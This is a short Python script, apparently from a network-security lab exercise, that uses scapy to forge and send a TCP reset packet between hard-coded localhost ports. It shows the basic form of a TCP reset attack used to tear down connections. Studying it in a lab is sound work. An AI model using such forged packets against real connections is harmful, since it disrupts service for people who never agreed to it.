#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RESET PACKET .............")
IPLayer = IP(src="127.0.0.1", dst="127.0.0.1")
TCPLayer = TCP(sport = 52194, dport = 5200, flags = "R", seq = 1, ack = 1)
pkt = IPLayer/TCPLayer 
ls(pkt)
send(pkt, verbose = 0)
